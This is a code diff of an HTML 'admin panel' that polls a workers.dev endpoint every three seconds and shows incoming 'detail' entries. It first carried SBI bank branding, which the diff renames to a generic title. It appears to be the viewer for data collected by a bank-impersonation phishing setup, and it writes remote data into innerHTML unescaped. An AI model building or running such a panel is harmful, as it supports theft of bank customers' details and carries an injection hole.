@@ -3,114 +3,77 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SBI ADMIN TERMINAL</title>
+    <title>LIVE ADMIN PANEL</title>
     <style>
-        /* Extreme Left Alignment */
         * { margin: 0; padding: 0; box-sizing: border-box; text-align: left !important; }
-        
-        body { background-color: #e9ecef; padding: 15px; font-family: 'Courier New', monospace; }
+        body { background-color: #f4f7fa; padding: 10px; font-family: 'Courier New', monospace; }
         
         .header { 
             background: #315195; color: #fff; padding: 15px; 
-            font-size: 18px; font-weight: bold; border-radius: 4px;
-            margin-bottom: 20px; display: flex; justify-content: space-between;
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            font-size: 16px; font-weight: bold; border-radius: 4px;
+            margin-bottom: 15px; display: flex; justify-content: space-between;
         }
 
-        /* Card Style - Har entry ka alag dabba */
         .log-card { 
-            background: #ffffff; 
-            border-left: 8px solid #e31e24; /* SBI Red Line */
-            margin-bottom: 15px; 
-            padding: 15px; 
-            border-radius: 4px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
-            width: 100%;
+            background: #fff; border-left: 8px solid #e31e24; 
+            margin-bottom: 12px; padding: 15px; border-radius: 4px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1); width: 100%;
         }
 
-        .detail-content { 
-            color: #000; 
-            font-size: 18px; 
-            font-weight: 900; /* Ekdum Bold */
-            white-space: pre-wrap; 
-            line-height: 1.6;
-            display: block;
+        .detail-text { 
+            color: #000; font-size: 18px; font-weight: 900; 
+            white-space: pre-wrap; line-height: 1.5; display: block;
         }
 
-        .meta-info { 
-            display: block; 
-            margin-top: 10px; 
-            font-size: 12px; 
-            color: #666; 
-            border-top: 1px dashed #ccc;
-            padding-top: 8px;
-            font-weight: normal;
+        .meta { 
+            display: block; margin-top: 10px; font-size: 12px; 
+            color: #666; border-top: 1px dashed #ccc; padding-top: 8px;
         }
 
-        .status { font-size: 12px; color: #00ff00; font-weight: normal; }
-        .error-msg { color: red; background: #fff; padding: 20px; text-align: center !important; border-radius: 5px; }
+        .status { font-size: 12px; color: #00ff00; }
     </style>
 </head>
 <body>
 
     <div class="header">
-        <span>LIVE DATA TERMINAL <span class="status" id="live-status">● CONNECTED</span></span>
-        <span id="log-count">0</span>
+        <span>LIVE TERMINAL <span class="status">● ONLINE</span></span>
+        <span id="count">0</span>
     </div>
 
-    <div id="logsContainer">Initialising Sync...</div>
+    <div id="logsContainer">Syncing Data...</div>
 
     <script>
-        // *** APNA WORKER URL EK BAAR PHIR CHECK KAR LO ***
         const workerURL = 'https://flat-fog-a0cd.sumankkuuyy.workers.dev/';
 
         async function fetchLogs() {
             try {
-                // Fetching data from Worker
-                const response = await fetch(workerURL);
-                
-                if (!response.ok) {
-                    throw new Error('Server Error: ' + response.status);
-                }
-
+                // Cache bypass karne ke liye timestamp add kiya hai
+                const response = await fetch(workerURL + '?t=' + new Date().getTime());
                 const data = await response.json();
+                
                 const container = document.getElementById('logsContainer');
-                document.getElementById('log-count').innerText = "Total: " + data.length;
+                document.getElementById('count').innerText = data.length;
 
                 if (data.length === 0) {
-                    container.innerHTML = "<div class='log-card' style='text-align:center !important;'>Waiting for first entry... (Database Khali Hai)</div>";
+                    container.innerHTML = "<p style='text-align:center !important;'>No Logs Found.</p>";
                     return;
                 }
 
-                // Data Rendering (Newest on Top)
+                // Data mapping
                 container.innerHTML = data.map(item => `
                     <div class="log-card">
-                        <span class="detail-content">${item.detail}</span>
-                        <span class="meta-info">⏰ Received at: ${item.time}</span>
+                        <span class="detail-text">${item.detail || 'No Detail'}</span>
+                        <span class="meta">ID: ${item.id} | Time: ${item.time}</span>
                     </div>
                 `).join('');
 
-                document.getElementById('live-status').style.color = "#00ff00";
-                document.getElementById('live-status').innerText = "● LIVE";
-
             } catch (err) {
-                document.getElementById('logsContainer').innerHTML = `
-                    <div class="error-msg">
-                        <b>ADMIN ERROR:</b> Worker se data nahi mil raha.<br>
-                        <small>${err.message}</small><br><br>
-                        1. Check if Worker URL is correct.<br>
-                        2. Check if D1 Binding 'DB' is added.
-                    </div>
-                `;
-                document.getElementById('live-status').style.color = "red";
-                document.getElementById('live-status').innerText = "● OFFLINE";
+                console.error("Fetch error:", err);
             }
         }
 
-        // Har 3 second mein auto-update
+        // Har 3 second mein auto-refresh
         setInterval(fetchLogs, 3000);
-        
-        // Pehli baar load karne ke liye
         window.onload = fetchLogs;
     </script>
 </body>
